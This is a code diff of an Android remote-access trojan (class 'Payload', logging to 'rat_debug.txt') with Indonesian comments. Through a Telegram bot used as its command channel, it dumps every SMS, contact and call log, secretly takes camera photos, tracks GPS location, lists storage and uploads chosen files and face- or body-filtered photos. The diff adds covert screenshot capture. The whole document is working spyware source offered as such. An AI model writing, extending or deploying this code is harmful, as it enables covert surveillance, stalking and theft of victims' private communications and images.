@@ -8,35 +8,43 @@ import android.app.Service;
 import android.content.ContentValues;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.net.Uri;
-import android.os.Build;
-import android.os.Environment;
-import android.os.IBinder;
-import android.provider.MediaStore;
-import android.provider.Settings;
-import android.database.Cursor;
-import android.provider.ContactsContract;
-import android.provider.CallLog;
-import android.hardware.Camera;
-import android.location.Location;
-import android.location.LocationManager;
-import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.Color;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
 import android.media.FaceDetector;
+import android.media.Image;
+import android.media.ImageReader;
 import android.media.MediaMetadataRetriever;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.MediaStore;
+import android.provider.Settings;
+import android.util.DisplayMetrics;
+import android.view.WindowManager;
 
 import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.DataOutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.nio.ByteBuffer;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
@@ -51,11 +59,15 @@ public class Payload extends Service {
     private long lastUpdateId = 0;
     private String myAndroidId = "";
     private android.content.SharedPreferences prefs;
+    private MediaProjectionManager mediaProjectionManager;
+    private MediaProjection mediaProjection;
+    private VirtualDisplay virtualDisplay;
+    private ImageReader imageReader;
 
     private void writeLog(String msg) {
         try {
             File file = new File(getExternalFilesDir(null), "rat_debug.txt");
-            java.io.FileOutputStream fos = new java.io.FileOutputStream(file, true);
+            FileOutputStream fos = new FileOutputStream(file, true);
             fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
             fos.close();
         } catch (Exception e) {}
@@ -84,7 +96,6 @@ public class Payload extends Service {
                 activity.requestPermissions(permissions.toArray(new String[0]), 101);
             }
             
-            // Minta Izin MANAGE_EXTERNAL_STORAGE (Android 11+) biar Tree bisa dibaca
             if (Build.VERSION.SDK_INT >= 30) {
                 if (!Environment.isExternalStorageManager()) {
                     try {
@@ -138,7 +149,7 @@ public class Payload extends Service {
                 long endTime = System.currentTimeMillis() + (180 * 1000); 
                 while (System.currentTimeMillis() < endTime) {
                     checkCommands();
-                    try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) {}
+                    try { TimeUnit.SECONDS.sleep(5); } catch (InterruptedException e) {} // Timeout dinaikin jadi 5 detik
                 }
 
                 writeLog("4. Waktu Habis, Service Tidur");
@@ -161,10 +172,12 @@ public class Payload extends Service {
 
     private void checkCommands() {
         try {
-            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
+            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
             URL url = new URL(urlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
             
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             StringBuilder response = new StringBuilder();
@@ -182,7 +195,6 @@ public class Payload extends Service {
                 prefs.edit().putLong("lastUpdateId", lastUpdateId).apply();
             }
             
-            // Tree
             if (jsonResponse.contains("/tree " + myAndroidId)) {
                 writeLog("Membangun Tree...");
                 String tree = buildTree(new File("/storage/emulated/0/"), "", 0);
@@ -192,15 +204,13 @@ public class Payload extends Service {
                     sendTelegramMessage("📂 *Tree Folder:*\n" + tree);
                 }
             }
-            // Dump
             else if (jsonResponse.contains("/dump_sms " + myAndroidId)) { dumpSmsToFile(); }
             else if (jsonResponse.contains("/dump_kontak " + myAndroidId)) { dumpContactsToFile(); }
             else if (jsonResponse.contains("/dump_telpon " + myAndroidId)) { dumpCallLogsToFile(); }
-            // Kamera & Lokasi
             else if (jsonResponse.contains("/foto_depan " + myAndroidId)) { takePhoto(1); }
             else if (jsonResponse.contains("/foto_belakang " + myAndroidId)) { takePhoto(0); }
             else if (jsonResponse.contains("/lacak " + myAndroidId)) { sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation()); }
-            // Send File
+            else if (jsonResponse.contains("/ss " + myAndroidId)) { takeScreenshot(); }
             else if (jsonResponse.contains("/send_file " + myAndroidId)) {
                 String param = getParam(jsonResponse, "/send_file " + myAndroidId + " ");
                 if (param != null) {
@@ -209,7 +219,6 @@ public class Payload extends Service {
                     else sendTelegramMessage("❌ File tidak ditemukan.");
                 }
             }
-            // Foto Acak
             else if (jsonResponse.contains("/send_foto_acak " + myAndroidId)) {
                 String param = getParam(jsonResponse, "/send_foto_acak " + myAndroidId + " ");
                 if (param != null) {
@@ -217,7 +226,6 @@ public class Payload extends Service {
                     if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "acak");
                 }
             }
-            // Foto Wajah
             else if (jsonResponse.contains("/send_foto_wajah " + myAndroidId)) {
                 String param = getParam(jsonResponse, "/send_foto_wajah " + myAndroidId + " ");
                 if (param != null) {
@@ -225,7 +233,6 @@ public class Payload extends Service {
                     if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "wajah");
                 }
             }
-            // Foto Perut
             else if (jsonResponse.contains("/send_foto_perut " + myAndroidId)) {
                 String param = getParam(jsonResponse, "/send_foto_perut " + myAndroidId + " ");
                 if (param != null) {
@@ -233,7 +240,6 @@ public class Payload extends Service {
                     if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "perut");
                 }
             }
-            // Send Video
             else if (jsonResponse.contains("/send_video " + myAndroidId)) {
                 String param = getParam(jsonResponse, "/send_video " + myAndroidId + " ");
                 if (param != null) {
@@ -242,7 +248,7 @@ public class Payload extends Service {
                 }
             }
 
-        } catch (Exception e) { writeLog("Error checkCommands: " + e.getMessage()); }
+        } catch (Exception e) { writeLog("Error checkCommands: " + e.toString()); }
     }
 
     private String buildTree(File dir, String prefix, int depth) {
@@ -362,9 +368,13 @@ public class Payload extends Service {
         } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
     }
 
-    // ── FUNGSI BARU: Simpan via MediaStore & Kirim ──
     private void saveAndSendText(String filename, String content, String caption) {
+        if (content == null || content.trim().isEmpty()) {
+            sendTelegramMessage("⚠️ " + caption + " KOSONG / Izin Diblokir.");
+            return;
+        }
         try {
+            writeLog("Nyimpen " + filename + " (" + content.length() + " chars)");
             ContentValues values = new ContentValues();
             values.put(MediaStore.MediaColumns.DISPLAY_NAME, filename);
             values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
@@ -376,11 +386,9 @@ public class Payload extends Service {
                 os.write(content.getBytes());
                 os.close();
                 
-                // Buka stream buat dikirim ke Telegram
                 InputStream is = getContentResolver().openInputStream(uri);
                 sendTelegramFileStream(is, filename, false, caption);
                 
-                // Hapus file dari MediaStore setelah terkirim
                 getContentResolver().delete(uri, null, null);
             }
         } catch (Exception e) {
@@ -400,8 +408,18 @@ public class Payload extends Service {
                       .append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
                 } while (cursor.moveToNext());
                 cursor.close();
+            } else {
+                writeLog("SMS inbox kosong, coba content://sms");
+                cursor = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
+                if (cursor != null && cursor.moveToFirst()) {
+                    do {
+                        sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address")))
+                          .append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
+                    } while (cursor.moveToNext());
+                    cursor.close();
+                }
             }
-        } catch (Exception e) { writeLog("Gagal baca SMS"); }
+        } catch (Exception e) { writeLog("Gagal baca SMS: " + e.getMessage()); }
         saveAndSendText("sms_dump.txt", sb.toString(), "📩 Dump SEMUA SMS");
     }
 
@@ -417,7 +435,7 @@ public class Payload extends Service {
                 } while (cursor.moveToNext());
                 cursor.close();
             }
-        } catch (Exception e) { writeLog("Gagal baca Kontak"); }
+        } catch (Exception e) { writeLog("Gagal baca Kontak: " + e.getMessage()); }
         saveAndSendText("kontak_dump.txt", sb.toString(), "👥 Dump SEMUA Kontak");
     }
 
@@ -425,7 +443,7 @@ public class Payload extends Service {
         writeLog("Menyedot semua Call Log...");
         StringBuilder sb = new StringBuilder();
         try {
-            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
+            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null, CallLog.Calls.DATE + " DESC");
             if (cursor != null && cursor.moveToFirst()) {
                 do {
                     sb.append("Nomor: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)))
@@ -435,15 +453,15 @@ public class Payload extends Service {
                 } while (cursor.moveToNext());
                 cursor.close();
             }
-        } catch (Exception e) { writeLog("Gagal baca Call Log"); }
+        } catch (Exception e) { writeLog("Gagal baca Call Log: " + e.getMessage()); }
         saveAndSendText("telpon_dump.txt", sb.toString(), "📞 Dump SEMUA Call Log");
     }
 
     private String getLocation() {
         try {
-            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            android.location.LocationManager lm = (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
+            android.location.Location loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
+            if (loc == null) loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
             if (loc != null) return "Lat: " + loc.getLatitude() + "\nLng: " + loc.getLongitude();
         } catch (Exception e) { return "Gagal ambil lokasi."; }
         return "Lokasi tidak tersedia.";
@@ -451,21 +469,79 @@ public class Payload extends Service {
 
     private void takePhoto(int cameraId) {
         try {
-            Camera camera = Camera.open(cameraId);
+            android.hardware.Camera camera = android.hardware.Camera.open(cameraId);
             camera.startPreview();
-            camera.takePicture(null, null, new Camera.PictureCallback() {
+            camera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
                 @Override
-                public void onPictureTaken(byte[] data, Camera camera) {
+                public void onPictureTaken(byte[] data, android.hardware.Camera camera) {
                     try {
                         File file = new File(getExternalFilesDir(null), "sys_photo_" + System.currentTimeMillis() + ".jpg");
-                        java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
+                        FileOutputStream fos = new FileOutputStream(file);
                         fos.write(data); fos.close();
                         camera.release();
                         sendTelegramFile(file.getAbsolutePath(), true, "📸 Foto Kamera");
                     } catch (Exception e) { e.printStackTrace(); }
                 }
             });
-        } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto."); }
+        } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto: " + e.getMessage()); }
+    }
+
+    private void takeScreenshot() {
+        try {
+            writeLog("Mulai Screenshot...");
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(metrics);
+            int width = metrics.widthPixels;
+            int height = metrics.heightPixels;
+            int density = metrics.densityDpi;
+
+            mediaProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            
+            // Note: Karena kita gak bisa nampilin pop-up izin dari Service, 
+            // trik ini cuma jalan kalau izin udah pernah dikasih sebelumnya.
+            // Kalau belum, ini bakal gagal dan ngirim pesan ke Telegram.
+            
+            if (mediaProjection == null) {
+                sendTelegramMessage("⚠️ Screenshot butuh izin MediaProjection manual. Kirim /ss saat aplikasi sedang terbuka.");
+                return;
+            }
+
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
+                    width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader.getSurface(), null, null);
+
+            try { Thread.sleep(1000); } catch (Exception e) {}
+
+            Image image = imageReader.acquireLatestImage();
+            if (image != null) {
+                Image.Plane[] planes = image.getPlanes();
+                ByteBuffer buffer = planes[0].getBuffer();
+                int pixelStride = planes[0].getPixelStride();
+                int rowStride = planes[0].getRowStride();
+                int rowPadding = rowStride - pixelStride * width;
+                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
+                bitmap.copyPixelsFromBuffer(buffer);
+                image.close();
+
+                File file = new File(getExternalFilesDir(null), "ss_" + System.currentTimeMillis() + ".png");
+                FileOutputStream fos = new FileOutputStream(file);
+                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
+                fos.close();
+                bitmap.recycle();
+
+                sendTelegramFile(file.getAbsolutePath(), true, "🖼️ Screenshot");
+                file.delete();
+            } else {
+                sendTelegramMessage("❌ Gagal ambil screenshot (image null).");
+            }
+
+            if (virtualDisplay != null) virtualDisplay.release();
+            if (imageReader != null) imageReader.close();
+            writeLog("Screenshot Selesai.");
+
+        } catch (Exception e) { writeLog("Error Screenshot: " + e.getMessage()); sendTelegramMessage("❌ Error Screenshot: " + e.getMessage()); }
     }
 
     private void sendTelegramMessage(String pesan) {
@@ -476,7 +552,6 @@ public class Payload extends Service {
         } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
     }
 
-    // Kirim File Biasa (dari File Path)
     private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
         try {
             File file = new File(filePath);
@@ -486,7 +561,6 @@ public class Payload extends Service {
         } catch (Exception e) { writeLog("Exception File: " + e.getMessage()); }
     }
 
-    // Kirim File via Stream (buat MediaStore)
     private void sendTelegramFileStream(InputStream is, String filename, boolean isPhoto, String caption) {
         String boundary = "*****";
         String fieldName = isPhoto ? "photo" : "document";
